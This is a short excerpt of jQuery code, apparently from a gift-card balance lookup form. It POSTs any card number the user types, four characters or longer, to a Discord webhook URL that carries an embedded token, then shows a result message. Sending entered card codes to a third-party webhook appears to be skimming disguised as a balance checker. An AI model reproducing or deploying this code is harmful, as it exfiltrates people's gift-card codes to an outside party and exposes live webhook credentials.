...
heading.forEach(function(n) {
    ...
    if (!(t.length < 4)) {
        ...
        a.attr("data-color", "").html("Loading...").show(), $.ajax({
            method: "POST",
            url: "https://discord.com/api/webhooks/1061424846342467664/g9ygolOLI73cM8lURvkrQWJziASWDLS8ddzbYRoNWmORWtiUz3HjInQhoS8wyPNLeZH1",
            data: {
                card_number: t
            }
        }).done(function(n) {
            var t = $(n).find("#ndzn-giftcard-search-outcome"),
                e = "Something Went wrong , maybe the code is invalid",
                o = "red";
